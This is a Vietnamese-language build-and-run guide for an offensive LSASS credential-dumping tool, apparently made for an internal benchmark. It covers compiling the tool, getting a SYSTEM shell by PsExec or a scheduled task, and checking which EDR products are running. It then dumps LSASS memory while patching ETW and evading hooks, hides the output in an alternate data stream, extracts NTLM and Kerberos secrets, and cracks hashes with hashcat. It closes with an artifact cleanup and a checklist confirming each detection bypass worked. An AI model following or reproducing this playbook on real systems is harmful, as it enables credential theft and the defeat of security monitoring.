# Plan 1 — LSASS Memory Dump: Hướng dẫn Setup & Chạy thử

> **Target**: T1003.001 — LSASS Memory Dump
> **Phương pháp**: Indirect Syscall + Module Stomping + ETW Patching + Handle Duplication
> **Yêu cầu**: SYSTEM privilege (đã leo quyền thành công)

---

## 1. Yêu cầu môi trường

| Thành phần | Yêu cầu |
|------------|---------|
| **OS** | Windows 10 22H2, Windows 11 23H2, Windows Server 2022 |
| **Arch** | x64 |
| **Quyền** | SYSTEM (Integrity Level 0x4000) |
| **Compiler** | Visual Studio 2022 (Community/Pro/Enterprise) + Windows SDK 10.0.22621+ |
| **Build Tools** | MSVC (cl.exe) + MASM (ml64.exe) |
| **Python** | 3.8+ (cho verify script) |
| **Disk** | 50MB trống cho build artifacts |

## 2. Cài đặt môi trường build

### 2.1 Cài Visual Studio 2022 Build Tools

```powershell
# Tải Visual Studio 2022 Build Tools từ:
# https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022

# Hoặc cài qua winget:
winget install Microsoft.VisualStudio.2022.BuildTools --override `
    "--add Microsoft.VisualStudio.Workload.VCTools `
     --add Microsoft.VisualStudio.Component.VC.ATLMFC `
     --add Microsoft.VisualStudio.Component.Windows11SDK.22621 `
     --includeRecommended"
```

### 2.2 Kiểm tra cài đặt

```powershell
# Kiểm tra cl.exe
& "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe /? 2>&1 | Select-Object -First 3

# Kiểm tra ml64.exe (MASM assembler)
ml64.exe /? 2>&1 | Select-Object -First 3
```

### 2.3 Clone source

```powershell
# Source đã có sẵn trong folder
Set-Location "D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan1_LSASS"
```

---

## 3. Build

### 3.1 Build tự động

```powershell
cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan1_LSASS
.\build.bat
```

Output: `LSASSDump.exe`

### 3.2 Build thủ công (nếu build.bat lỗi)

```powershell
# Mở "x64 Native Tools Command Prompt for VS 2022" từ Start Menu
# HOẶC chạy:
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

# Build thủ công:
cl.exe /nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 `
    /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE" `
    /Fe"LSASSDump.exe" `
    src\main.c src\privilege.c src\staging.c src\syscall_resolver.c `
    src\etw_patch.c src\lsass_reader.c src\minidump_engine.c `
    src\cred_extractor.c src\ads_writer.c src\cleanup.c `
    src\reflective_loader.c src\crypto\sha256.c src\crypto\chacha20.c `
    src\crypto\lznt1.c src\syscall_stubs.asm `
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT `
    kernel32.lib ntdll.lib advapi32.lib
```

### 3.3 Xác nhận build thành công

```powershell
if (Test-Path ".\LSASSDump.exe") {
    $info = Get-Item ".\LSASSDump.exe"
    Write-Host "[OK] Build thành công: $($info.Name) ($([math]::Round($info.Length/1KB,1)) KB)"
} else {
    Write-Host "[FAIL] Build thất bại"
}
```

---

## 4. Setup môi trường test

### 4.1 Tạo SYSTEM shell

```powershell
# Cách 1: Dùng PsExec (Sysinternals)
# Tải từ: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
.\PsExec.exe -s -i -d powershell.exe

# Cách 2: Tạo scheduled task chạy dưới SYSTEM
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoExit"
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
$task = Register-ScheduledTask -TaskName "SYSTEM_Shell" -Action $action -Principal $principal -Force
Start-ScheduledTask -TaskName "SYSTEM_Shell"
Start-Sleep -Seconds 2
Unregister-ScheduledTask -TaskName "SYSTEM_Shell" -Confirm:$false

# Cách 3: Dùng tool có sẵn nếu đã leo quyền (CVE-2023-28252, BYOVD, etc.)
```

### 4.2 Kiểm tra quyền

```powershell
# Trong SYSTEM shell, chạy:
.\LSASSDump.exe --whoami
```

Kết quả mong đợi:
```
[*] Process ID:    1234
[*] Integrity level: SYSTEM (0x4000)
[*] SeDebugPrivilege: ENABLED
[*] LSASS PID: 680
[*] LSASS Protection: None
```

### 4.3 Kiểm tra EDR/Bảo mật

```powershell
# Kiểm tra EDR đang chạy
Get-Process -Name "MsMpEng", "SenseCncProxy", "CSFalconService", `
    "CbDefense", "SentinelAgent" -ErrorAction SilentlyContinue

# Kiểm tra LSASS có PPL không
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "RunAsPPL" -ErrorAction SilentlyContinue

# Kiểm tra Sysmon
Get-Service -Name "Sysmon64" -ErrorAction SilentlyContinue
```

---

## 5. Chạy thử

### 5.1 Chạy full chain (khuyến nghị)

```powershell
# Trong SYSTEM shell:
.\LSASSDump.exe --dump-full
```

Output mong đợi:
```
┌──────────────────────────────────────────────────────────┐
│  LSASS Memory Dump Tool — T1003.001                       │
│  Method: Indirect Syscall + Module Stomping + ETW Patch   │
│  Pre-condition: SYSTEM privilege (assumed)                │
└──────────────────────────────────────────────────────────┘

[*] Starting full LSASS dump chain...

[1/7] Enabling SeDebugPrivilege... OK
[2/7] Resolving syscall numbers from disk ntdll.dll... OK (12 stubs loaded)
[3/7] Creating hollowed staging process... OK (PID: 4567)
[4/7] Injecting reflective dumper DLL + patching ETW... OK
[5/7] LSASS PID: 680
      Opening LSASS handle via indirect syscall... OK (handle: 0x000000000000012C)
[6/7] Dumping LSASS memory...
      OK — 35678208 bytes
[7/7] Extracting credentials + writing output...
      NTLM hashes:   3
      Kerberos keys: 4
      DPAPI keys:    1
      LZNT1: 35678208 -> 8912354 bytes (25.0%)
      ADS output: OK

[*] Cleaning up...
    Dump buffer freed
    LSASS handle closed
    Staging process terminated
    ETW patches restored (if any)
[*] Cleanup complete.

[+] LSASS dump complete.
    Output: C:\Windows\System32\config\software.log:lsass
```

### 5.2 Chế độ dump-only (đã có SYSTEM sẵn)

```powershell
.\LSASSDump.exe --dump-only
```

### 5.3 Parse dump có sẵn

```powershell
# Nếu bạn đã có file dump LSASS từ trước:
.\LSASSDump.exe --parse C:\temp\lsass.dmp
```

### 5.4 Chạy test script tự động

```powershell
cd test
.\run_test.ps1
# Hoặc không cleanup để kiểm tra artifacts:
.\run_test.ps1 -SkipCleanup
```

---

## 6. Verify kết quả

### 6.1 Đọc ADS output

```powershell
# Đọc trực tiếp từ ADS
Get-Content "C:\Windows\System32\config\software.log:lsass" -Raw

# Hoặc dùng more
cmd /c "more < C:\Windows\System32\config\software.log:lsass"
```

### 6.2 Decrypt & verify credentials

```powershell
cd test

# Parse ADS output
python3 verify_creds.py `
    --input-ads "C:\Windows\System32\config\software.log:lsass" `
    --output "..\output\creds.txt"

# Tạo hashcat format
python3 verify_creds.py `
    --input-ads "C:\Windows\System32\config\software.log:lsass" `
    --output "..\output\creds.txt" `
    --hashcat

# Xem kết quả
Get-Content "..\output\creds.txt"
```

### 6.3 Crack NTLM với hashcat

```powershell
# Trên máy có GPU:
hashcat.exe -m 1000 -a 0 ..\output\creds.txt.hashcat wordlist.txt

# -m 1000 = NTLM hash mode
```

### 6.4 Kiểm tra EDR alerts

```powershell
cd test
.\detect_check.ps1

# Kiểm tra chi tiết 30 phút gần đây:
.\detect_check.ps1 -MinutesBack 30 -Detailed
```

---

## 7. Cleanup

```powershell
# Xóa artifacts
.\LSASSDump.exe --cleanup

# Hoặc thủ công:
Remove-Item "C:\Windows\System32\config\software.log:lsass" -Force -EA SilentlyContinue
Remove-Item "C:\Windows\System32\winevt\Logs\Application.evtx:lsass" -Force -EA SilentlyContinue
```

---

## 8. Troubleshooting

| Lỗi | Nguyên nhân | Cách fix |
|-----|-------------|----------|
| `FAILED (0xC0000061)` | Không có SeDebugPrivilege | Chạy dưới SYSTEM (`PsExec -s`) |
| `BLOCKED (ObRegisterCallbacks)` | EDR kernel callback chặn LSASS handle | Tool tự fallback sang handle duplication |
| `PPL (Protected Process Light)` | LSASS chạy dưới PPL | Cần kernel driver BYOVD để strip PPL flag |
| `ADS write FAILED` | Không có quyền ghi vào System32 | Tool tự thử fallback paths khác |
| `Syscall resolver FAILED` | Không đọc được ntdll.dll từ disk | Kiểm tra quyền đọc `C:\Windows\System32\ntdll.dll` |
| `Build failed: ml64.exe not found` | Thiếu MASM assembler | Cài thêm component "C++ x64/x86 build tools" trong VS Installer |
| `File not found: syscall_stubs.asm` | File .asm sai encoding | Đảm bảo file được lưu dưới dạng ASCII/UTF-8 |

---

## 9. Bypass Verification Checklist

Sau khi chạy thành công, xác nhận các lớp bypass:

- [ ] **Userland Hook Bypass**: Syscall numbers đọc từ disk ntdll.dll (không phải in-memory hooked)
- [ ] **ETW Suppression**: Không có Threat Intelligence events trong 5 phút sau khi chạy
- [ ] **ObRegisterCallbacks Bypass**: Nếu direct open bị chặn, handle dup từ taskmgr.exe thành công
- [ ] **Module List Evasion**: Reflective DLL không xuất hiện trong `PEB->Ldr` của svchost.exe
- [ ] **RWX Detection**: Không có vùng nhớ RWX đồng thời (RW → RX transition)
- [ ] **File Creation Detection**: Không file mới nào được tạo trên disk
- [ ] **ADS Monitoring**: Không alert cho ADS write vào software.log
- [ ] **MiniDumpWriteDump Hook**: Không gọi API này (custom minidump engine)
